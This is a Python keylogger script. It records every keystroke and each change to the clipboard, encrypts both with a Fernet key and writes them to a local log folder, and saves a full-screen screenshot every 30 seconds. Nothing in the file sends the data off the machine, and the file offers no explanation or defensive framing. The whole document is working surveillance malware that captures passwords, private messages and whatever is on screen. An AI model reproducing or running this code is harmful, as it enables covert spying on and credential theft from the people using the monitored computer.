import os, time, threading
from pynput import keyboard
import pyperclip
from PIL import ImageGrab
from cryptography.fernet import Fernet

log_dir = os.path.join(os.path.dirname(__file__), "keylogs_advanced")


os.makedirs(log_dir, exist_ok=True)

key_file = os.path.join(log_dir, "key.key")
log_file = os.path.join(log_dir, "keystrokes.txt")
clip_file = os.path.join(log_dir, "clipboard.txt")

if not os.path.exists(key_file):
    with open(key_file, 'wb') as f:
        f.write(Fernet.generate_key())

with open(key_file, 'rb') as f:
    key = f.read()
fernet = Fernet(key)

def on_press(key):
    try:
        val = f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {key.char}'
    except AttributeError:
        val = f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {str(key)}'
    with open(log_file, 'ab') as f:
        f.write(fernet.encrypt(val.encode()) + b'\n')

def log_clipboard():
    recent = ""
    while True:
        try:
            data = pyperclip.paste()
            if data != recent:
                recent = data
                msg = f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {data}'
                with open(clip_file, 'ab') as f:
                    f.write(fernet.encrypt(msg.encode()) + b'\n')
        except: pass
        time.sleep(5)

def take_screenshots():
    while True:
        img = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        img.save(os.path.join(log_dir, f"{timestamp}.png"))
        time.sleep(30)

if __name__ == "__main__":
    threading.Thread(target=log_clipboard, daemon=True).start()
    threading.Thread(target=take_screenshots, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
